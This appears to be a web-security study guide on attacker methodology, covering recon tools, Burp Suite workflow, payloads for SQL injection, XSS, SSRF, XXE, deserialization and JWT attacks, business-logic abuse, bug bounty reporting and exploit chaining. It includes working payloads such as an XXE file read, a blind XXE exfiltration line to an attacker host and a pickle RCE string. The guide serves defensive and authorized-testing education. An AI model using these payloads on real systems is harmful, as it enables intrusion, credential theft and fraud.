# Attacker Methodology — How Real Hackers Find and Exploit Web Vulnerabilities

Companion to `learning_path.md` (resources) and `payment_bypass.md` (vuln classes).
This document is about **how to think and work like an attacker**: recon → analysis →
exploitation → chaining, with the tools each stage uses.

---

## 1. Reconnaissance — what attackers enumerate first

Recon (reconnaissance) is 80% of the job. Before touching a vulnerability, attackers
build a map of the target. The goal is to answer four questions:

1. **What is this application?** — tech stack, frameworks, languages, versions.
2. **What does it expose?** — endpoints, params, files, users, data.
3. **How does it talk?** — API structure, auth model, tokens.
4. **What history does it have?** — deleted endpoints, old versions, leaked secrets.

### 1.1 Tech stack fingerprinting

- **Wappalyzer** (browser extension) and **BuiltWith** fingerprint the site:
  CMS (WordPress, Drupal), web servers (nginx, Apache, IIS), JS frameworks
  (React, Angular), analytics, CDNs, and — importantly — **outdated versions**.
- `whatweb` / `wappalyzercli` automate this from the CLI.
- Why it matters: a version number maps to known CVEs and known default exploits.
  "WordPress 5.8 + Contact Form 7" is not a target, it's a checklist.
- Check `Server`, `X-Powered-By`, and `Set-Cookie` headers in Burp too — they
  leak technology even when the UI doesn't.

### 1.2 Directory and file brute-forcing

- **ffuf** (fast fuzzer), **gobuster**, **feroxbuster** hammer the server with
  guesses from wordlists (SecLists: `common.txt`, `raft-small-words.txt`).
- Typical targets: `/admin`, `/api`, `/backup`, `/.git/`, `/config`, `/uploads`,
  `/swagger`, `/.env`, `/phpmyadmin`, `/server-status`.
- Extensions matter: try `.php`, `.bak`, `.old`, `.swp`, `.zip` — backups and
  source files leak credentials and source code.
- `.git` exposure is a classic: `git-dumper` or `gitsploit` reconstructs the
  whole source tree from an exposed `.git` directory.

### 1.3 Subdomain enumeration

- Attacker surface expands: `staging.`, `dev.`, `api.`, `admin.`, `test.` subdomains
  often run older/weaker versions.
- Tools: **subfinder**, **amass**, **assetfinder**, **crt.sh** (certificate
  transparency logs — every cert ever issued for the domain), **dnsx**, **puredns**.
- For labs: just check `/etc/hosts`-style manual guessing plus brute force.

### 1.4 robots.txt, sitemap.xml, and well-known files

- `robots.txt` literally lists paths the site doesn't want crawled — often the
  exact admin and backup paths attackers want.
- `sitemap.xml` enumerates every public page (and occasionally private ones).
- `/security.txt`, `/.well-known/`, `/humans.txt` leak info too.

### 1.5 JavaScript analysis — the biggest beginner superpower

- Modern SPAs put **everything in the frontend**: API endpoints, parameter names,
  feature flags, and sometimes **hardcoded API keys, tokens, and internal URLs**.
- Technique: open DevTools → Sources (or download all JS via DevTools → "Save all
  as HAR"), then grep for `api`, `key`, `token`, `secret`, `password`, `http`.
- Tools: **LinkFinder**, **JSFinder**, **subjs**, **waybackurls** for historical JS.
- In Burp: use the "Find comments" / grep on saved responses, or extensions like
  "JS Link Finder". Every endpoint discovered in JS is a request to replay in
  Burp Repeater.
- Buried source maps (`.map` files) can reconstruct original source code.

### 1.6 Wayback Machine and historical data

- `web.archive.org` keeps snapshots of the site over years — old JS files,
  deleted endpoints, old login pages that no longer exist.
- Tools: **waybackurls** (all URLs ever seen), **gau** (Google + Wayback archive),
  **waymore**. Query `web.archive.org/cdx/search/cdx?url=target.com/*`.
- Old endpoints are prime IDOR/broken-auth territory — the feature may be gone
  from the UI but still live on the server.

### 1.7 The recon output attackers keep

A working notes file with: tech versions, endpoint list, params per endpoint,
auth mechanism, interesting files, and a prioritized "test here" list. This is the
"attack surface map" that everything else runs on.

---

## 2. The hacker mindset

Attackers don't "try random things" — they run a loop:

### 2.1 Core beliefs

- **"Every input is evil."** Every field, header, cookie, URL param, and file
  upload is attacker-controlled until proven otherwise.
- **"Trust boundaries are lies."** The frontend "locks" things but the server is
  the only authority. Hidden fields, disabled buttons, and client-side validation
  are *suggestions*, not security.
- **"The client can lie."** Any value sent to the server can be modified — and will be.
- **"What does the server do with it?"** The question isn't "what does the UI
  allow?" but "what does the code do when it receives X?"

### 2.2 Attacker checklist per feature

For every endpoint discovered:

1. What inputs does it accept? (params, body, headers, cookies)
2. Which inputs affect control flow or data access? (IDs, roles, prices)
3. What happens with: missing values, wrong types, huge values, negative numbers,
   SQL/XSS payloads, other users' IDs?
4. Does auth actually enforce what the UI implies? (try without login, with a
   low-priv user, with a tampered session)
5. Can I replay, reorder, or skip steps? (race the checkout, reuse a coupon twice)
6. Where does this data go next? (stored? rendered? emailed? logged?)
7. Is there a second-order effect? (payload fires later in admin panel = stored XSS)

### 2.3 The "assume breach" habit

Attackers assume some input somewhere is mishandled, then hunt for *which* one.
Manual testing beats scanning because scanners only know known-bad patterns —
the business-logic and chaining bugs that pay real money require a human brain
walking the app like a user who is also a liar.

---

## 3. Burp Suite workflow deep-dive

Burp is the attacker's browser. Everything goes through its proxy.

### 3.1 Setup

- Proxy → Options → listener on `127.0.0.1:8080`; point browser/Foxproxy at it.
- Install CA cert (http://burp → "CA Certificate") so HTTPS intercept works.
- Scope the target (Target → Scope) so you don't accidentally attack other sites.

### 3.2 The core loop

1. **Browse normally** through Burp proxy — every request lands in **Proxy → HTTP
   history** and **Logger**.
2. **Identify interesting requests** — anything touching auth, IDs, prices,
   file uploads, admin functions, search, comments.
3. **Send to Repeater** (right-click → Send to Repeater) — your manual exploit
   workbench. Edit any part of the request: method, path, headers, cookies, body.
4. **Modify → Send → Read response** — this is the fundamental exploit loop:
   change one thing, observe the difference. Diff responses to confirm impact.

### 3.3 Burp tabs explained

- **Proxy → Intercept**: pause and edit requests *in flight*. Use to toggle
  values before they even hit the server (e.g., change `user=alice` to `admin`
  on a request you didn't want to craft from scratch).
- **Repeater**: the main tool. Send arbitrary modified requests, compare
  responses, build multi-step attacks (e.g., get a token, then use it).
- **Intruder**: automated fuzzing of positions in a request. Payload sets +
  attack types (Sniper for one position, Battering ram for same payload in
  multiple, Pitchfork/Cluster bomb for combos). Used for brute force, parameter
  fuzzing, ID enumeration.
- **Comparer**: diff two responses/requests byte-by-byte — proves whether your
  tampering changed anything (e.g., `isAdmin: false` → `true`).
- **Logger**: passive log of every request/response — search it later, find
  params you missed while browsing.
- **Target → Site map**: auto-built tree of everything you've touched; filter
  by MIME type to find JSON/API endpoints and static files.
- **Scanner** (Pro only): automated vuln scanning — finds known patterns, not
  logic bugs.
- **Extensions**: Autorize (auth bypass testing), Turbo Intruder (race
  conditions), JWT Editor, InQL (GraphQL), Logger++ (better logging).

### 3.4 Community vs Pro

| Feature | Community (free) | Pro (paid) |
|---|---|---|
| Proxy, Repeater, Intruder, Comparer | ✅ | ✅ |
| Burp Scanner (automated) | ❌ | ✅ (DAST engine) |
| Project files/saving sessions | ❌ (per-project limit) | ✅ unlimited |
| CI integration, active scan API | ❌ | ✅ |

**Verdict**: learn on Community — it's fully sufficient for manual methodology.
Pro's scanner is nice for breadth but generates noise and misses logic bugs.

---

## 4. OWASP ZAP — the automated alternative

- **OWASP ZAP** (Zed Attack Proxy) is the free/open-source Burp equivalent, with
  a stronger **automated scanner** built in.
- Workflow: spider (traditional or AJAX spider) → passive scan → **active scan**
  (injects real payloads, actually exploits).
- Strengths: free, scriptable (zaproxy API / Automation Framework), CI-friendly,
  good baseline coverage of OWASP Top 10.
- Weaknesses vs Burp: clunkier manual workflow, noisier active scans, weaker
  extensions ecosystem.
- **When to use which**: ZAP for quick automated sweeps and regression
  scanning of your own apps in CI; Burp for the actual exploit development
  and manual hunting. Many testers run both: ZAP maps, Burp exploits.

---

## 5. Exploitation fundamentals per vulnerability class

### 5.1 SQL Injection — how payloads actually work

The DB parses your input as SQL. Goal: break out of the string context and
append commands.

- **Detection**: `'` (single quote) → look for 500 errors or weird behavior.
  Then `' OR '1'='1` style tautologies, or `1' AND '1'='2` vs `'1'='1` to
  confirm boolean influence.
- **Union-based** (data extraction): `UNION SELECT username,password FROM users--`
  — requires matching column count (enumerate with `ORDER BY n` until error)
  and compatible types. `-- ` comments out the rest of the query.
- **Blind boolean**: no data in response, but behavior differs. Ask true/false
  questions: `' AND SUBSTRING(password,1,1)='a` — extract char-by-char. Slow
  but universal.
- **Time-based blind**: `' AND SLEEP(5)--` — if response takes 5s, condition true.
  Use `BENCHMARK`/`pg_sleep` depending on DB. This is how you extract data when
  nothing is ever displayed.
- **Error-based**: force DB errors that leak data: `AND extractvalue(1,concat(0x7e,(SELECT version())))`.
- **Out-of-band**: make DB send DNS/HTTP to your server (`LOAD_FILE`, `xp_dirtree`)
  for blind exfiltration on hardened targets.
- Always fingerprint the DB first: error messages, `@@version`, `sqlite_master`,
  `information_schema`, `pg_tables` — syntax differs per engine.

### 5.2 XSS — three types

- **Reflected**: payload in URL/param echoed in response.
  `<script>alert(1)</script>` → test context first: in HTML body? in an
  attribute? inside JS string? inside a URL? Payload must break out of that
  context (`"><script>`, `'-alert(1)-'`, `javascript:` URIs).
- **Stored**: payload saved server-side (comments, usernames, bios) and fired
  for every viewer — including admins. Highest impact; aim here.
- **DOM-based**: payload never touches the server — JS on the page reads it
  (e.g., `location.hash`) and sinks it into `innerHTML`/`eval`/`document.write`.
  Test by putting payloads in URL fragments and watching with DOM Invader
  (Burp Pro) or DevTools.
- Escalation: `alert(1)` proves XSS; real exploit steals `document.cookie`
  or performs actions as the victim (`fetch('/transfer',...)`).

### 5.3 CSRF token bypass techniques

- Remove the token entirely; reuse an old token; use another session's token.
- If token is tied to session but not validated per-request, try **token
  fixation** or swapping tokens between accounts.
- Check if token is only validated when present — omit it and see.
- Try alternate content types (`text/plain`, `application/json` may skip the
  CSRF middleware) and GET requests for state changes.
- Referer/Origin checks can often be bypassed by omitting headers (older
  browsers/clients) or via subdomain XSS.
- SameSite=Lax/None cookie attributes decide whether the browser even sends
  cookies cross-site — check them first.

### 5.4 SSRF — Server-Side Request Forgery

- Any feature that makes the server fetch a URL: webhooks, image import by URL,
  PDF generators, URL preview/unfurl, "check this feed".
- Payloads: `http://127.0.0.1:8080/admin`, `http://169.254.169.254/latest/meta-data/`
  (AWS metadata — steals IAM creds), `http://localhost:6379` (Redis), internal
  hostnames (`http://intranet/`), DNS rebinding.
- Bypass filters with: decimal/octal IP (`2130706433`), IPv6 `[::1]`, URL-encoding,
  `http://evil.com@127.0.0.1`, redirects (`http://yourserver/redirect`), `file://`,
  `gopher://` for raw TCP.
- Cloud metadata endpoints are the crown jewel: IMDSv1 gives creds with no auth.

### 5.5 XXE — XML External Entities

- Any XML parser accepting external entities lets you read local files or hit
  internal services.
- Payload:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  ```
- Blind XXE: exfiltrate via external DTD you host:
  `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://you/?x=%file;'>">%eval;`
- Check SVG uploads, SOAP APIs, SAML, docx/xlsx parsers — anywhere XML is consumed.
- Even "JSON-only" APIs sometimes parse XML if `Content-Type` is switched.

### 5.6 Insecure deserialization

- App serializes objects (Java `readObject`, PHP `unserialize`, Python pickle,
  .NET `ViewState`, Node `node-serialize`) and attacker controls the blob.
- Detection: look for base64 blobs in cookies/params (`rO0AB...` = Java,
  `O:8:"..."` = PHP, pickle opcodes). Flip bytes and watch errors.
- Java: ysoserial gadget chains (CommonsCollections etc.) → RCE.
- PHP: POP chains via magic methods (`__wakeup`, `__destruct`).
- Python pickle: `cos\nsystem\n(S'id'\ntR.` style payloads → RCE.
- .NET ViewState: if `__VIEWSTATE` isn't MAC-validated, forge it
  (`ysoserial.net`); if MAC'd but key is weak/default, crack it.

### 5.7 JWT attacks

JWT = header.payload.signature (base64url). Attack surface:

- **`alg: none`**: change `{"alg":"HS256"}` to `{"alg":"none"}`, strip signature,
  send `header.payload.` — many libs accept unsigned tokens. Also try
  `None`, `nOnE` case variants.
- **Algorithm confusion**: RS256→HS256 — use the server's *public key* as the
  HMAC secret and re-sign with it. Get the public key from `/jwks.json` or JWKS endpoint.
- **Weak secret**: HS256 = HMAC with a passphrase. Crack offline with
  **hashcat** (`-m 16500`) or **jwt_tool** wordlists — "secret", "123456",
  company name. Then forge any claims (`role: admin`, `sub: victim`).
- **`kid` (key ID) injection**: header `kid` may point to a file/key. Try
  `kid: ../../dev/null` (empty key), SQL injection in kid lookup,
  `kid: /proc/self/environ`, or point it at a file you control.
- **`jku`/`x5u` header injection**: server fetches keys from a URL you supply →
  host your own JWKS → sign with your own key.
- **Claim tampering**: even with valid signature, check if claims like `role`,
  `isAdmin`, `exp` are trusted blindly (test by re-signing after secret crack).
- **`exp` handling**: expired tokens accepted? `exp: 9999999999`?
- Tool: **jwt_tool** (`python jwt_tool.py <token> -C -d` crack, `-T` tamper).

---

## 6. Business logic hunting — the manual thinking process

This is where beginner scanners fail and real money lives. No tool finds
"negative quantity" or "coupon reuse" — you walk the flow like a suspicious user.

### 6.1 The methodology

1. **Map the flow completely in Burp**: buy a cheap item end-to-end, save every
   request (they're all in Logger/history). Note: cart → coupon → checkout →
   payment → confirmation.
2. **List every parameter** in those requests: `price`, `quantity`, `coupon`,
   `product_id`, `user_id`, `total`, `discount`, `currency`, hidden fields.
3. **Question each one**: "Does the server trust this value, or recompute it?"
   Test by changing it and checking the *final* result (order total, confirmation page, email).

### 6.2 Classic manipulations

- **Negative values**: `quantity=-1` or `price=-100` — refunds/credits you money.
- **Zero/overflow**: `quantity=0`, huge numbers, `quantity=1e10`, integer
  overflow (`2147483647+1`), float tricks (`0.001`, NaN).
- **Price tampering**: change `price=9.99` → `price=0.01` in the request —
  if the server trusts the client-sent price instead of looking it up by
  `product_id`, you win. (This is exactly what `payment_bypass.md` covers.)
- **Coupon abuse**: reuse same coupon twice, stack coupons, apply after
  checkout, race two checkouts with the same coupon.
- **Race conditions**: send the same request N times simultaneously —
  double-spend coupons/balance, transfer more than you have, claim a
  limited-quantity item twice. Tool: **Turbo Intruder** (Burp extension) with
  `single-packet attack` — sends all requests in one TCP packet so they hit
  the server truly concurrently. Burp Community's Intruder is too slow for this.
- **Workflow bypass**: skip steps — go straight to `/checkout/confirm` without
  payment; change `step=3` to `step=4`; replay an old "payment successful"
  request after a failed one; access order-confirmation URL of someone else.
- **Horizontal/vertical escalation**: change `user_id`, `order_id`, `tenant_id`
  in requests to access other users' data (IDOR — see vuln classes).
- **Currency/rounding**: `price=0.001` rounds down; different currency with
  favorable rounding; negative discount exceeding price.
- **File upload logic**: allowed extensions vs. allowed content types vs.
  filename checks — polyglot files (GIF+PHP), double extensions, `.htaccess`
  upload, path traversal in filename.

### 6.3 The mindset

"If the developer computed X on the server, tampering fails. If the client sent
X and the server used it, tampering wins." Your job is to find which values
the server *recomputes* vs *trusts*.

---

## 7. CTF platforms for practice

Ranked roughly beginner → advanced:

| Platform | Style | Best for |
|---|---|---|
| **PortSwigger Web Security Academy** | Free labs per vuln class, Burp-integrated | **#1 for beginners** — teaches Burp + each vuln class properly |
| **PicoCTF** | Beginner CTF, yearly | Gentle intro to web + general hacking |
| **OverTheWire: Bandit → Natas** | Command-line wargames | Linux + web basics (Natas = web) |
| **TryHackMe** | Guided rooms with walkthroughs | Structured learning paths, room "Web Fundamentals" |
| **HackTheBox** | Realistic boxes, harder | After TryHackMe — full machines, harder web |
| **Root-Me** | App challenges categorized by vuln type | Drill specific classes (XSS, SQLi) repeatedly |
| **CTFtime / CTFd events** | Team competitions | Real-world mixed challenges, writeups galore |

**Recommended path**: PortSwigger labs for every class → TryHackMe "Web
Fundamentals" + specific rooms → PicoCTF → HTB starting point/tier 0 → real
bug bounty.

---

## 8. Bug bounty methodology

### 8.1 Platforms & payouts

- **HackerOne** (largest), **Bugcrowd**, **Intigriti** (EU-strong). Also
  `yeswehack`, direct `security.txt` programs, and Google's VRP.
- Payouts vary wildly: low-sev info leaks $50–500; XSS $500–2,500; IDOR data
  exposure $1,000–10,000; RCE/auth bypass $5,000–50,000+. Top hunters make
  six figures/year; median earnings are much lower — it's a skill lottery.

### 8.2 The workflow

1. **Read the scope — literally.** In-scope domains/assets, out-of-scope
   exclusions, safe-harbor terms, payout table. Testing out-of-scope = legal
   trouble even if you found a real bug.
2. **Recon**: subfinder/amass → httpx probe → nuclei (known-CVE scan) →
   gau/waybackurls for endpoints → JS analysis (LinkFinder) → build asset
   inventory. Tools: **reconftw**, **autorecon**, or manual pipeline.
3. **Automated baseline**: nuclei + ZAP passive — catches known-CVE low-hanging
   fruit; use as leads, not findings.
4. **Manual testing**: pick ONE app/feature at a time. Burp through it.
   Prioritize: auth flows, user-to-user interactions, file uploads,
   anything handling money/data. This is 90% of real findings.
5. **Verify impact**: prove it with minimal demonstration (e.g., read *your
   own* second account's data via IDOR — never exfiltrate real user data).
6. **Write the report** (below).
7. **Triage → fix → bounty**. Duplicate/NA is normal — don't take it personally.

### 8.3 Report writing — what separates paid from closed-as-NA

Structure:
- **Title**: `[Asset] Vuln class in feature — impact` (e.g., "IDOR in
  /api/orders/{id} leaks any user's order details").
- **Severity + CVSS** estimate.
- **Summary**: 2–3 sentences: what, where, impact.
- **Steps to reproduce**: numbered, copy-pasteable curl/Burp requests a
  triager can run verbatim. Include exact payloads.
- **Impact**: concrete — "attacker reads any user's PII", not "could be bad".
- **Evidence**: screenshots/screen recording, redacted.
- **Remediation** (optional but appreciated): how to fix.

Golden rule: write the report for a tired engineer at 2am who must reproduce
your finding in 10 minutes. Vague reports = N/A. Precise reports = paid.

---

## 9. Common beginner mistakes

1. **Scanning without permission** — even "just nuclei" against a site you
   don't own/aren't authorized for is illegal (CFAA etc.). Own labs and
   written scope only.
2. **Not reading scope** — out-of-scope assets (e.g., `blog.target.com`, third
   parties) invalidate the report and can get you banned.
3. **Duplicate reports** — check the program's disclosed/hacktivity list
   before spending hours; low-hanging fruit is picked over.
4. **Poor report quality** — "I found XSS" with a screenshot of `alert(1)`
   and no repro steps = instant N/A or informational.
5. **Claiming impact you didn't prove** — "could steal all data" without
   demonstrating = downgraded or rejected. Prove minimum viable impact.
6. **Excessive testing / DoS** — automated scans at full speed can take
   programs down; rate-limit yourself, no brute-force at scale unless scope allows.
7. **Touching real user data** — accessing other users' actual data beyond
   proof-of-concept can violate program rules (access only what's needed to
   demonstrate, then stop).
8. **Not version-controlling notes** — losing your recon notes and request
   history wastes hours; export Burp Logger, keep a findings file.
9. **Scanner-only mindset** — running ZAP/Burp scanner and submitting every
   alert = noise; triage each finding manually, prove exploitability.
10. **Giving up after first N/A** — normal part of the process; learn why it
    was rejected (usually impact/scope/repro issues) and iterate.

---

## 10. From vuln to exploit chain — how small bugs compound

Real compromises are chains, not single bugs. The attacker's skill is
*connecting* findings.

### 10.1 Classic chains

- **XSS → session theft → account takeover**: stored XSS in a comment/profile
  fires when an admin views it → steals admin's `session` cookie (if not
  HttpOnly) or performs actions as them → full takeover.
- **IDOR → data leak → privesc**: IDOR in `/api/user/{id}` leaks every user's
  email → use emails for targeted phishing or find an admin account → combine
  with weak password reset flow → admin takeover.
- **SSRF → cloud creds → infrastructure**: SSRF hits `169.254.169.254` →
  steals IAM role credentials → enumerate S3 buckets → find backups/secrets →
  pivot to internal network.
- **Open redirect → OAuth token theft**: open redirect in OAuth `redirect_uri`
  → steal authorization code → exchange for access token → API access.
- **XXE → file read → creds → RCE**: XXE reads `/etc/passwd`, app config,
  SSH keys or DB creds → log into admin panel → upload webshell → RCE.
- **Subdomain takeover → cookie theft**: dangling CNAME on `status.target.com`
  → claim it on GitHub Pages/S3 → serve JS that reads `*.target.com` cookies
  (if scoped to `.target.com`) → session hijack.
- **Race condition → financial fraud**: single-packet race on transfer →
  double-spend balance → buy gift cards → cash out.
- **Info leak → auth bypass**: `.git` exposure → source code → find hardcoded
  JWT secret or backdoor → forge admin token.

### 10.2 The chaining mindset

When you find a "low severity" bug, ask:
- What does this *give* an attacker? (info, access, execution)
- What *other* finding does it enable? (XSS gives JS execution → needs a
  cookie/token to steal; SSRF gives internal access → needs a juicy internal
  service)
- Can I chain two mediums into a high? (IDOR + weak reset = ATO)

This is why bug bounty hunters get paid for "just" an XSS — chained with a
session-theft or CSRF it's full account takeover, and severity reflects the
*chain*, not the individual bug.

---

## Sources & further reading

- PortSwigger Web Security Academy — https://portswigger.net/web-security
- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- OWASP Testing Guide — https://owasp.org/www-project-web-security-testing-guide/
- HackTricks (payload bible) — https://book.hacktricks.xyz
- PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings
- SecLists (wordlists) — https://github.com/danielmiessler/SecLists
- jwt_tool — https://github.com/ticarpi/jwt_tool
- Turbo Intruder (race conditions) — https://github.com/PortSwigger/turbo-intruder
- ZAP — https://www.zaproxy.org / OWASP ZAP docs
- HackerOne Hacktivity (real reports) — https://hackerone.com/hacktivity
- Bugcrowd Crowdstream — https://bugcrowd.com/crowdstream
- Intigriti — https://www.intigriti.com
- TryHackMe — https://tryhackme.com
- HackTheBox — https://www.hackthebox.com
- OverTheWire — https://overthewire.org
- crt.sh (CT logs) — https://crt.sh
- Wayback Machine CDX API — https://web.archive.org/cdx/search/cdx

---

*Written for ethical practice on owned systems and authorized bug-bounty scope only.*
